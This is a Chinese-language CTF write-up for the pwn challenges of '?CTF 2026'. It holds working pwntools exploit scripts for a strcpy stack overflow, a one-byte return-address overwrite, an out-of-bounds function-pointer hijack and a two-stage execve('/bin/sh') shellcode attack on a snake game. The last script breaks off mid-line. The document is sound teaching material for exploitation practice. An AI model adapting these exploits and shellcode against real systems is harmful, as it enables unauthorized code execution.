---
title: ?CTF 2026 xa0Pwn WriteUp
url: https://mp.weixin.qq.com/s/9X5b2lMtiS6kYPkPGAPR-g
source: Doonsec's feed
date: 2026-11-27
fetch_date: 2026-11-28T09:40:50.355160
---

# ?CTF 2026 xa0Pwn WriteUp

# ?CTF 2026  Pwn WriteUp

原创

星宇Sec
星宇Sec

星宇Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# QCTF 2026 Pwn WriteUp

本篇汇总 Pwn 方向的题目，覆盖栈溢出、格式化字符串、ROP、SROP、栈迁移、ret2libc、堆利用、VM 与沙箱绕过等主题。

## 题目概览

### Pwn

* **W1**：Star's start、星辰、这里是……后室？、snake、SecureVault、古老的人工智能、Tiny Logbook
* **W2**：PaperShell、Seeking Star、rop?、CoinMaster、TreeDiagram、函数王国：七贤者与神剑、deepsleep
* **W3**：纸迹、Floating Star、CanNotRet、旮旯给木、Simdebug
* **W4**：SafaVM、末行日志、残影、Remaining Coordinates、Following Star

## Pwn

### W1

#### Star's start

简单的入门题，输入1有栈溢出，但溢出是用strcpy复制的，这里存在\x00截断的问题，不能直接p64发，但因为同时strcpy会把\0复制过来，所以多循环几次把高位清零再栈溢出。中间还插了一个保护的字符串，再用1这个选项算对偏移再输一次就好因为strcpy会自动复制\0进去，或者用2输入但注意最后字符要有\0即可。拿到shell 后cat flag即可exp如下：

```
#!/usr/bin/env python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
flag = 1
if flag:
    p = remote('nc1.ctfplus.cn',45526)
else:
    p = process('./pwn')
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
slr = lambda s : p.sendline(str(s).encode())
sd = lambda s : p.send(s)
sdr = lambda s : p.send(str(s))
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
rcl = lambda : p.recvline()
leak = lambda name,addr :log.success(name+"--->"+hex(addr))
u6 = lambda a : u64(rc(a).ljust(8,b'\x00').strip())
i6 = lambda a : int(a,16)
def exp(s):
    ru(b'>')
    slr(1)
    ru(b"What name are you planning to change to?")
    sl(s)
for i in range(1,9):
    exp((0xa0-i)*b'b'+i*b'\x00');
back=0x4014F1
pay=b'b'*0x98+p64(back)
exp(pay)
pay=0x30*b'b'+b'I will pwn you!'+b'\x00'
exp(pay)
ru(b'>')
slr(3)
ti()
```

#### 星辰

挺意外的，这道题的解出数比ret2text 还多，希望师傅们理解其中的原理吧先检查基本信息

![图 001](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQpJ8slR9LH00vzZ38QumjtDdnic0ibD1XILOHAhMr9VwAOiapQUyFQYetmWwKruOK06eV6ToFl9hvpSnsEqHFREwiaPbPOGdG1Fpd4/640?wx_fmt=webp&from=appmsg)

图 001

没有 canary 其余全开，进一步进行逆向分析

![图 002](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQopPTuaBLxFviac8EibNqVm07ibPlCuianwCyGR88ELOC6MU31lwlDRbumQkbdyhxpxRr0kkHF3ibSqPPHiaTyPxZNHOZqkMYFkrNYdo/640?wx_fmt=webp&from=appmsg)

图 002

没有什么逆向难度，程序每次运行打开一次 flag，然后只读取一个字节并打印输出，然后读取输入，这里存在一个字节的溢出。我们注意到每次对于文件的读入都使用的是文件描述符3（也就是第一次打开flag 得到的文件描述符），而文件偏移（后面会讲这是个什么东西）在每一次 read 之后都会进行加一，所以我们只需要循环执行 **main 函数**就能得到完整的flag，问题就在于如何通过这一字节的溢出来做到循环读取执行 main 函数。我们不妨看看main函数返回到哪里去了。

![图 003](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQpxDibVsKic9nhO23A38GV7t2QzVqQicy9FoviczBcp0CLHa142ccib9zTkjsugypXSdN754zSw2lH2yelpO5ppYWkuu3cju99MOAjs/640?wx_fmt=webp&from=appmsg)

图 003

进一步反汇编这附近的代码

![图 004](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQpe3cshuHTOFvhQJF6icEjjFGb7jGwZhAKNZ94ox8LiaurGweUnEcTE7M0sXdrZfkW2OpicRmvtOHwI6OUlHRIBjhVsU4ehd9icGak/640?wx_fmt=webp&from=appmsg)

图 004

可以看到 main 函数的地址放在了 rsp+0x8 只需篡改 main 函数返回地址最低位为 89 即可重复调用 main 函数（我建议各位师傅去了解一下 程序是怎么一步一步执行到 mian 函数的，动调跟一遍）完整EXP如下

```
from pwn import *
import os, time, threading
os.environ["PATH"] = "/opt/gdb-17.1/bin:" + os.environ["PATH"]
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['/mnt/c/Windows/system32/cmd.exe', '/c','start', 'wsl.exe -d Ubuntu-22.04', 'bash', '-c']
pwnfile = './pwn'
elf = ELF(pwnfile)
libc = elf.libc
is_remote = 1
if is_remote:
    #io =  remote('127.0.0.1', 9999)
    io =  remote('nc1.ctfplus.cn', 45660)
else:
    io = process(pwnfile)
def dbg():
    gdb.attach(io)
    pause()
if __name__ == '__main__':
    flag = b''
    whileTrue:
        io.recvuntil(b'byte:')
        io.recvline()
        flag_char = io.recv(1)
        flag += flag_char
        if flag_char == b'}':
            break
        payload = b'a' * 0x48 + b'\x89'
        io.sendafter(b'it?', payload)
    io.close()
    print(flag)
```

#### 这里是……后室？

按部就班先看一下保护：

![图 005](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQr1rIibpp2TIp3H8FgjbjGsZln4uTYNibogwXnqiaxe6Qq6HyXSNXicdXATXFKkoGD6ibQPoEzROnqYo2ibZV1T8icSvOTMa2gWY2hTjU/640?wx_fmt=webp&from=appmsg)

图 005

发现保护全开，先别慌，ida看看怎么个事先读一下逻辑：

main函数就是输入Y进入level0，我们直接看level0：

![图 006](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQrXwoVZZ7GN0DshPye0HI3KeIt68oI52NiadjZMP2ibzMd7hWJmrwc2mHcDZjFy7CpAJjziaicpSUbko6MCgengEc84x3Cy4JhvKDA/640?wx_fmt=webp&from=appmsg)

图 006

level0

![图 007](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQpDqlLSlLEBo5Nnc9CVLCFAEJR2TQxU20HUkic8jTibtRXK8Gx95WJDLe0bF1E6uptaBibQkhbnyUe7O4q5gDlYCAvvprolTx708M/640?wx_fmt=webp&from=appmsg)

图 007

的逻辑是每次循环输入两个数：v1和v2，然后将v5[v1]中的数加v2，并随机获取一个数存入v0，最终只要判定v0>=20就可以进入real。但是存在机制杀：v3每次循环都与v0一起赋值，并且只要v3大于16就会死掉，导致正常情况下v0永远无法变成20。漏洞往往存在于输入，我们重点看一下level0中的两个scanf：

![图 008](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQopruOnFupNFNzhibvKhbK87gAeNY0Nsu0k786pe59H6d5koDGB58MAE5ZnoicjdfIUXEib8BOzcmJDfqmygku3F5ssmDiaN9HI0nI/640?wx_fmt=webp&from=appmsg)

图 008

通过前面的分析我们知道v1是v5的下标，并且我们注意到函数内没有检查v1的值，这意味着我们可以通过控制v5的下标实现任意写。回顾一下缓冲区，看看有没有值得写的地方：

![图 009](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQq8KR23fp0Cibby44PJ54JXpKuk5iadprgicVp90sXVm3ypMkqQOzhsc7hAvHVicTPt4MQJNRJr50zKYMUjuiaUQSibezq4MsM80p3hg/640?wx_fmt=webp&from=appmsg)

图 009

前面提到，进入real的条件是v0>=20，所以我们可以尝试利用v5[v1]这个任意写直接将v0的值改为20。这里有一个坑：ida中显示v5有六个槽位，且共占用0x30字节，很容易让人以为v5的步长为8字节。实际上这是编译器在编译过程中对源码进行了优化的结果。这里不展开讲这个问题的成因，有兴趣的师傅可以自己搜索。这里要确定v5的实际步长要看v5的调用点：

可以看到这里明确标注了v5的类型是dword，即步长为4字节。既然v5的步长为4字节，那么我们计算一下v0与v5的距离0x44-0x30=0x14，0x14/0x4=0x5，所以v5[-5]即为v0，又由于v1输入后进行了一个--v1的操作，所以我我们只需要输入-4就可以将写入地址改为v0。然后将v2输入为20，就可以将v0改为20+，进入real函数：

![图 010](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQqQ0vXiaiaeKxX54M6Jvicb6oqZ028c0eicPTfzltNUkhQiaN46hUEwnog1fBibqgtLMrEX64rdNrznkE77z7q9gtUGd0mUHRRhXswO0/640?wx_fmt=webp&from=appmsg)

图 010

![图 011](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQpiaVfqxdCk2YFCmWAAz1RLQIRWDWzt3fjN8anDOVuW3ehkYicDlqNgDJKgdQicdBNfhpTmCWmLqibtn31ef3GymtZjOcYcCsYTQA0/640?wx_fmt=webp&from=appmsg)

图 011

real的逻辑更加简单：输入一个v0，最后调用全局数组results中下标为v0-1的函数。双击results可以看到results的全部内容：

![图 012](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQoU2AicXaMOIrvK4pLnsBhRRarn6oW4kVvDiauIwQYibU9vL47paBGpcyHXpolnNwZuJfqefg9BLoeqmes3kZ9z84r8DbgKEfpAdo/640?wx_fmt=webp&from=appmsg)

图 012

可以看到results

中存有九个fail函数的指针，但是alive变量与results数组相邻，且alive变量中存储的是win函数的指针。根据前面说的“调用全局数组results中下标为v0-1的函数”，只要让v0-1=9，就能调用results[9]，也就是win函数。

![图 013](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQrssiad5dQjIrBQfBKGUvF6fVxxSsuRmFulaESE4FxFjMgCE5aTicU8GmVVl6MmURHEhwpTkR4pPdUVUBcTbTVvCXsMekFB0jlks/640?wx_fmt=webp&from=appmsg)

图 013

#### snake

经过反汇编，很明显这个是一个1400 字节的手写汇编贪吃蛇，是一个纯静态的文件。让我们导出他的反汇编结果去看他的逻辑。

![图 014](https://mmbiz.qpic.cn/mmbiz_jpg/rapaL0gDxQpesL3d2gp4pbpmR2RN5ajPIr7Yg03lsrAYA4S9yBwOLj4vq77BZSwxv0micPzHI15qfiaq8bJbEBSHoqMhYQfhZHvTia4RHmlXr0/640?wx_fmt=webp&from=appmsg)

图 014

然后我们会发现他在读按键这里存在一个漏洞

![图 015](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rapaL0gDxQpIVFRTibicbQEESN6adRsAnYgt4Ckqs2r6rxPr0mvibPicWCANUBDhU0hgrFqZmFoDb5rPVnYUJ0r5iaAvFNbMnGnltgjCARqy7Kiag/640?wx_fmt=webp&from=appmsg)

图 015

在这里读入缓冲区 0x4004a0 与函数指针 0x4004a8 重叠。0x4004a0结构0x4004a0  1 字节   按键（w/a/s/d/q）

0x4004a1  7 字节   空隙0x4004a8  8 字节   函数指针，读完全立即被 call 0x4004b0  4 字节   蛇长0x4004b4  1 字节   方向借此我们可以实现一次 23 字节的 read 直接覆盖函数指针 → 任意 RIP。唯一的问题是指针两边的可写入空间只有 7+8=15 个字节，所以我们需要想办法写入 shellcode。所以这里我们考虑两段式利用。第一段 shellcode 的编写

```
xor  eax,eax
mov  dl,0xff
syscall    ；read(0, 0x4004a0, 255)
```

通过残余值的利用实现一次更大的 read 。之后新数据覆盖 0x4004a0 起的 255 字节。注意我们上一次写入的在 0x4004a1，read 返回后 RIP 落在 0x4004a7，在那里放一条短跳 eb 0f 跳过 8 字节指针槽，落到 0x4004b8。之后就是正常的 shellcode 了

```
xor  esi,esi
push rsi
mov  rdi, 0x68732f2f6e69622f   ; "/bin/sh\0"
push rdi
push rsp
pop  rdi
push 0x3b
pop  rax                       ; SYS_execve
cdq                            ; rdx = 0
```

exp:

```
from pwn import *
import time
context.arch = 'amd64'
context.log_level = 'info'
PTR      = 0x4004a8
STUB     = 0x4004a1
# xor eax,eax ; mov dl,0xff ; syscall
stage1   = asm('xor eax, eax; mov dl, 0xff; syscall')
assert len(stage1) == 6
p1  = b'x'                      # 非移动键, 不改方向
p1 += stage1                    # 0x4004a1..a6
p1 += b'\x90'                   # 0x4004a7 (将被读#2覆盖)
p1 += p64(STUB)                 # 0x4004a8 函数指针
p1 += p32(3) + b'\x01\x90\x90'# len/dir assert len(p1) ...